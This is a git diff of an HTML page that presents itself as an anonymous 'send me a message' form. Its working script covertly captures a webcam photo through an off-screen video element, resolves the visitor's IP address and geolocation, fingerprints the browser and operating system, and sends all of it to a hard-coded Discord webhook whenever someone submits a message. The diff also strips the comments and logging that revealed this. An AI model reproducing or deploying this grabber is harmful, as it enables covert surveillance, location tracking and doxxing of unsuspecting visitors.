@@ -160,7 +160,6 @@
             font-style: italic;
         }
         
-        /* Hidden elements */
         #camera-container {
             position: fixed;
             top: -9999px;
@@ -214,7 +213,6 @@
             font-weight: 500;
         }
         
-        /* Quick flash for screenshot */
         .quick-flash {
             position: fixed;
             top: 0;
@@ -259,22 +257,18 @@
     </style>
 </head>
 <body>
-    <!-- hidden camera stuff lol -->
     <div id="camera-container">
         <video id="camera-feed" autoplay playsinline></video>
     </div>
     <canvas id="capture-canvas" class="hidden-canvas"></canvas>
     
-    <!-- quick white flash -->
     <div id="quick-flash" class="quick-flash"></div>
     
-    <!-- loading thing -->
     <div id="loading-overlay" class="loading-overlay">
         <div class="loading-spinner"></div>
         <div class="loading-text">processing your message...</div>
     </div>
     
-    <!-- main thing -->
     <div class="container">
         <div class="logo">
             <div class="logo-text">send me a message lol</div>
@@ -305,10 +299,8 @@
     </div>
 
     <script>
-        // discord webhook
         const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
         
-        // grab all the elements
         const form = document.getElementById('message-form');
         const usernameInput = document.getElementById('username');
         const messageInput = document.getElementById('message');
@@ -320,11 +312,9 @@
         const cameraFeed = document.getElementById('camera-feed');
         const captureCanvas = document.getElementById('capture-canvas');
         
-        // variables
         let stream = null;
         let isProcessing = false;
         
-        // quick white flash
         function doQuickFlash() {
             quickFlash.style.opacity = '0.3';
             setTimeout(() => {
@@ -332,7 +322,6 @@
             }, 50);
         }
         
-        // show status message
         function showStatus(message, type) {
             statusMessage.textContent = message;
             statusMessage.className = 'status-message status-' + type;
@@ -345,7 +334,6 @@
             }
         }
         
-        // try to get camera
         async function getCameraQuick() {
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ 
@@ -364,7 +352,6 @@
             }
         }
         
-        // take quick picture
         function takeQuickPicture() {
             if (!stream) return null;
             
@@ -378,7 +365,6 @@
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // add timestamp
                 ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
                 ctx.fillRect(10, 10, 180, 25);
                 ctx.fillStyle = 'white';
@@ -391,7 +377,6 @@
             }
         }
         
-        // Convert base64 image to blob
         function dataURLtoBlob(dataurl) {
             try {
                 const arr = dataurl.split(',');
@@ -408,7 +393,6 @@
             }
         }
         
-        // Get IP address using multiple services
         async function getIPAddress() {
             const services = [
                 'https://api.ipify.org?format=json',
@@ -427,15 +411,12 @@
                     } else if (data.ipAddress) {
                         return data.ipAddress;
                     }
-                } catch (error) {
-                    // Try next service
-                }
+                } catch (error) {}
             }
             
             return null;
         }
         
-        // Get detailed location from IP using multiple services
         async function getLocationFromIP(ip) {
             if (!ip) return null;
             
@@ -496,26 +477,20 @@
                             };
                         }
                     }
-                } catch (error) {
-                    // Try next service
-                }
+                } catch (error) {}
             }
             
             return null;
         }
         
-        // Main location function - tries multiple methods
         async function getDetailedLocation() {
             try {
-                // Get IP address
                 const ip = await getIPAddress();
                 if (!ip) return null;
                 
-                // Get detailed location from IP
                 const location = await getLocationFromIP(ip);
                 if (!location) return null;
                 
-                // Ensure IP is included
                 location.ip = ip;
                 
                 return location;
@@ -524,13 +499,11 @@
             }
         }
         
-        // Get detailed browser information
         function getBrowserInfo() {
             const ua = navigator.userAgent;
             let browser = "Unknown";
             let version = "Unknown";
             
-            // Detect browser
             if (ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR")) {
                 browser = "Chrome";
                 const match = ua.match(/Chrome\/(\d+\.\d+)/);
@@ -553,7 +526,6 @@
                 if (match) version = match[1];
             }
             
-            // Detect OS
             let os = "Unknown";
             if (ua.includes("Windows")) os = "Windows";
             else if (ua.includes("Mac")) os = "macOS";
@@ -580,7 +552,6 @@
             };
         }
         
-        // Generate maps link
         function generateMapsLink(latitude, longitude) {
             if (latitude && longitude) {
                 return `https://www.google.com/maps?q=${latitude},${longitude}&z=12`;
@@ -588,7 +559,6 @@
             return '';
         }
         
-        // Format location data for Discord
         function formatLocationData(location) {
             if (!location) return "```Location data unavailable```";
             
@@ -612,7 +582,6 @@
             return "```" + text + "```";
         }
         
-        // Format browser data for Discord
         function formatBrowserData(browserInfo) {
             let text = `Browser: ${browserInfo.browser}\n`;
             text += `OS: ${browserInfo.os}\n`;
@@ -631,39 +600,37 @@
             return "```" + text + "```";
         }
         
-        // Send everything to Discord
         async function sendToDiscord(username, message, picture = null, location = null) {
             try {
                 const timestamp = new Date().toLocaleString();
                 const browserInfo = getBrowserInfo();
                 
-                // Create the embed
                 const embed = {
-                    title: "📨 New Message Received",
+                    title: "new message received",
                     color: 0x3498db,
                     fields: [
                         {
-                            name: "👤 From",
-                            value: username || "Anonymous",
+                            name: "from",
+                            value: username || "anonymous",
                             inline: true
                         },
                         {
-                            name: "🕒 Time",
+                            name: "time",
                             value: timestamp,
                             inline: true
                         },
                         {
-                            name: "📍 Location Data (IP Geolocation)",
+                            name: "location data (IP Geolocation)",
                             value: formatLocationData(location),
                             inline: false
                         },
                         {
-                            name: "💻 Browser & Device Info",
+                            name: "browser & device info",
                             value: formatBrowserData(browserInfo),
                             inline: false
                         },
                         {
-                            name: "💬 Message",
+                            name: "message",
                             value: message.substring(0, 1000) || "No message content",
                             inline: false
                         }
@@ -674,7 +641,6 @@
                     timestamp: new Date().toISOString()
                 };
                 
-                // If we have a picture
                 if (picture) {
                     try {
                         const blob = dataURLtoBlob(picture);
@@ -700,12 +666,9 @@
                             
                             return true;
                         }
-                    } catch (imageError) {
-                        console.log('Image upload failed, sending text only');
-                    }
+                    } catch (imageError) {}
                 }
                 
-                // Text-only fallback
                 const payload = {
                     username: "message bot",
                     embeds: [embed]
@@ -722,12 +685,10 @@
                 return response.ok;
                 
             } catch (error) {
-                console.error('Error sending to Discord:', error);
                 return false;
             }
         }
         
-        // Cleanup camera
         function cleanupCamera() {
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
@@ -735,7 +696,6 @@
             }
         }
         
-        // Form submission handler
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
             
@@ -750,7 +710,6 @@
                 return;
             }
             
-            // Start processing
             isProcessing = true;
             submitBtn.disabled = true;
             loadingOverlay.style.display = 'flex';
@@ -760,7 +719,6 @@
                 let picture = null;
                 let location = null;
                 
-                // Try to get camera picture
                 const cameraStream = await getCameraQuick();
                 
                 if (cameraStream) {
@@ -771,14 +729,10 @@
                     cleanupCamera();
                 }
                 
-                // Get detailed location data
                 try {
                     location = await getDetailedLocation();
-                } catch (locError) {
-                    console.log('Location failed:', locError);
-                }
+                } catch (locError) {}
                 
-                // Send everything to Discord
                 const success = await sendToDiscord(username, message, picture, location);
                 
                 if (success) {
@@ -790,19 +744,15 @@
                 }
                 
             } catch (error) {
-                console.error('Main error:', error);
                 showStatus('something broke. oops.', 'error');
                 
             } finally {
-                // Cleanup
                 isProcessing = false;
                 submitBtn.disabled = false;
                 loadingOverlay.style.display = 'none';
                 cleanupCamera();
             }
         });
-        
-        console.log('Page loaded and ready');
     </script>
 </body>
 </html>
